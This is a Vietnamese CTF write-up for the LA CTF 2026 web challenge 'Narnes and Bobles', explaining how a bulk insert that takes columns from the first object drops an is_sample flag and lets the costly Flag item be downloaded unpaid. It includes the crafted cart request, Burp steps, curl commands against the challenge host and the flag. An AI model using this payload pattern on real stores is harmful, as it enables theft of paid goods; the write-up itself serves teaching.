---
layout: single
title: "[Writeup] LA CTF 2026 - Narnes and Bobles (Web)"
date: 2026-02-10
classes: wide
categories: [LACTF 2026, web]
tags: [lactf, web, logic-error, mass-assignment, sqlite, nodejs]
---

Chào bạn, đây là bài viết tiếp theo trong series writeup LA CTF. Bài này chúng ta sẽ cùng phân tích một lỗi logic cực kỳ thú vị khi xử lý dữ liệu mảng (array) trong các thư viện ORM/Database Driver của Node.js, dẫn đến việc bỏ sót các cột quan trọng khi lưu vào cơ sở dữ liệu.

## 1. Tổng quan (Overview)

**Thử thách:** Narnes and Bobles
**Mục tiêu:** Tải về file sách `Flag` (giá **$1,000,000**) mà không cần trả tiền (tài khoản khởi tạo chỉ có **$1,000**).

![Challenge Overview](/assets/images/lactf/narnes-and-bobles/overview.png)

Cơ chế đặc biệt: Có tùy chọn **Add Sample** (bản đọc thử) với giá **$0**.

## 2. Phân tích Source Code

### `books.json`

File này chứa danh sách sách. Chú ý ID của cuốn sách Flag:

```json
{
  "id": "2a16e349fb9045fa",
  "title": "Flag",
  "file": "flag.txt",
  "price": 1000000
}
```

### `server.js` - Logic xử lý

Có hai endpoint quan trọng:

#### 1. Endpoint `/cart/add`

Thêm sách vào giỏ hàng, tính tổng tiền và kiểm tra số dư.

```javascript
// Line 138: Tính tiền
const additionalSum = productsToAdd
  .filter((product) => !+product.is_sample) // [!] Nếu có is_sample=1 -> !1 = false -> Giá 0
  .map((product) => books.find((b) => b.id === product.book_id).price)
  .reduce((a, b) => a + b, 0);

// Line 147: Lưu vào Database
await db`INSERT INTO cart_items ${db(cartEntries)}`;
```

*   **Server nhận:** Một mảng `products` từ client.
*   **Tại dòng 139:** Nó kiểm tra `is_sample`. Nếu `is_sample` là truthy (ví dụ `1`), nó sẽ được tính là bản mẫu (giá 0 đồng).

#### 2. Endpoint `/cart/checkout`

Thanh toán và trả về file.

```javascript
// Line 152: Lấy thông tin từ DB
const cart = await db`SELECT * FROM cart_items WHERE username=${res.locals.username}`;

// Line 165: Quyết định file trả về
const path = item.is_sample ? book.file.replace(...) : book.file;
```

*   **Server kiểm tra:** Cột `is_sample` **được lưu trong database** để quyết định trả về file sample hay file full (Flag).

## 3. Lỗ hổng (Vulnerability)

Vấn đề nằm ở cách thư viện `bun:sqlite` (hoặc cách hàm helper `db()` được implement) xử lý **Bulk Insert** (chèn nhiều dòng cùng lúc).

Khi bạn insert một mảng các object:

```javascript
db`INSERT INTO cart_items ${db([obj1, obj2])}`
```

Bun sẽ **chỉ nhìn vào các key của object ĐẦU TIÊN (obj1)** trong mảng để xác định các cột cần insert vào câu lệnh SQL.

### Kịch bản khai thác

Nếu ta gửi một danh sách sản phẩm gồm 2 món theo thứ tự sau:

1.  **Món 1 (Mồi):** Một cuốn sách thường (rẻ tiền), object này **KHÔNG CÓ** thuộc tính `is_sample` (hoặc để `undefined`).
2.  **Món 2 (Flag):** Cuốn sách Flag, object này **CÓ** thuộc tính `is_sample: 1`.

### Hệ quả

*   **Tại Javascript (`/cart/add`):**
    *   **Món 1:** Không có `is_sample` -> Tính giá bình thường (rẻ).
    *   **Món 2:** Có `is_sample=1` -> `!1` là `false` -> Được lọc ra khỏi tính tổng tiền (Giá 0).
    *   => Tổng tiền < Số dư tài khoản => **Hợp lệ**.

*   **Tại Database (SQLite Insert):**
    *   Do Món 1 (object đầu tiên) **không có key `is_sample`**, câu lệnh SQL sinh ra sẽ **bỏ qua cột `is_sample` cho TOÀN BỘ mảng**.
    *   => Món 2 (Flag) được lưu vào DB nhưng giá trị cột `is_sample` sẽ là mặc định (`NULL` hoặc `0`).

*   **Tại `/cart/checkout`:**
    *   Đọc từ DB ra, Món 2 (Flag) có `is_sample` là falsy (do bị lưu thiếu).
    *   => Server quyết định trả về **Full File** (Flag) thay vì file sample.

## 4. Hướng dẫn khai thác (Exploitation)

### Cách 1: Sử dụng Burp Suite (Khuyên dùng)

Nếu bạn quen dùng giao diện đồ họa hoặc đã chặn request bằng Burp.

1.  **Capture Request:**
    *   Mở trình duyệt, cấu hình proxy qua Burp Suite.
    *   Đăng nhập vào web thử thách.
    *   Thêm một cuốn sách bất kỳ vào giỏ.
    *   Trong Burp, chặn request `POST /cart/add`.

2.  **Sửa Request (Repeater):**
    *   Chuột phải vào request -> **Send to Repeater** (hoặc Ctrl+R).
    *   Tại tab Repeater, sửa phần Body của request thành JSON:

    ```json
    {
      "products": [
        {
          "book_id": "a3e33c2505a19d18"
        },
        {
          "book_id": "2a16e349fb9045fa",
          "is_sample": 1
        }
      ]
    }
    ```

    *   Nhấn **Send**. Quan sát response bên phải, nếu thấy thông báo cập nhật số dư thành công là OK.

3.  **Checkout:**
    *   Quay lại trình duyệt/Burp, gửi request tới `/cart/checkout`.
    *   Server trả về file `.zip`.
    *   Lưu file đó về máy và giải nén để lấy Flag.

### Cách 2: Sử dụng cURL (Dòng lệnh)

Đây là cách nhanh nhất nếu bạn đã có `curl`.

**Bước 1: Đăng ký & Lấy Cookie**

```bash
curl -c cookies.txt -X POST https://narnes-and-bobles-zof3x.instancer.lac.tf/register \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"hacker123\",\"password\":\"password123\"}" -L
```

**Bước 2: Gửi Payload Hack**

Gửi request `/cart/add` với 2 sản phẩm như đã phân tích.

```bash
curl -b cookies.txt -X POST https://narnes-and-bobles-zof3x.instancer.lac.tf/cart/add \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "products[0][book_id]=a3e33c2505a19d18" \
  --data "products[1][book_id]=2a16e349fb9045fa" \
  --data "products[1][is_sample]=1"
```

**Bước 3: Checkout và lấy Flag**

```bash
curl -b cookies.txt -X POST https://narnes-and-bobles-zof3x.instancer.lac.tf/cart/checkout \
  -o flag.zip
```

## 5. Tại sao nó hoạt động? (The "Why")

Bạn có thể thắc mắc tại sao lại dùng `is_sample=1` hay `!+product.is_sample` hoạt động như thế nào.

### Giải mã "Ma thuật" `!+`

Cụm `!+product.is_sample` thực chất là hai phép toán:

1.  **Dấu `+` (Unary Plus):** Ép kiểu dữ liệu sang Số (Number).
    *   `"1"` -> `1`
    *   `undefined` -> `NaN`
2.  **Dấu `!` (Logical NOT):** Chuyển con số đó sang Boolean rồi đảo ngược lại.
    *   `0` (False) -> `True`
    *   `1`, `2`, `NaN` (Truthy cho số khác 0, nhưng NaN là Falsy) -> `False`? Khoan, `NaN` là Falsy, vậy `!NaN` là `True`.

**Bảng so sánh giá trị:**

| Giá trị `is_sample` | `+is_sample` | Boolean | `!+is_sample` (Kết quả) | Hành động |
| :--- | :--- | :--- | :--- | :--- |
| `undefined` (Không gửi) | `NaN` | False | `True` | **Tính tiền** |
| `0` | `0` | False | `True` | **Tính tiền** |
| `1` | `1` | True | `False` | **Bỏ qua (0đ)** |
| `2` | `2` | True | `False` | **Bỏ qua (0đ)** |

### Tóm tắt quy trình

1.  Bạn gửi `is_sample: 1` cho cuốn sách Flag -> JS thấy số 1 (True) nên **không tính tiền**. (Thành công bước 1).
2.  Bạn để cuốn sách đầu tiên (Mồi) **không có** `is_sample` -> Database Driver bị lừa, nó **không tạo cột `is_sample`** để lưu vào bảng cho cả mảng. (Thành công bước 2).
3.  Kết quả: Flag được lưu vào DB với `is_sample` mặc định là `0` (False) -> Server hiểu lầm là bạn đã mua bản Full.

## 6. Tổng kết

**Flag:** `lactf{matcha_dubai_chocolate_labubu}`

**Bài học rút ra:**
Đừng bao giờ tin tưởng vào việc tự động suy diễn Schema từ dữ liệu đầu vào của người dùng (Mass Assignment). Luôn luôn định nghĩa rõ ràng các cột cần chèn hoặc chuẩn hóa dữ liệu (Sanitize) trước khi đưa vào hàm Database.

Hy vọng bài writeup này giúp bạn hiểu rõ hơn về lỗ hổng Mass Assignment và Logic Error trong lập trình Web!
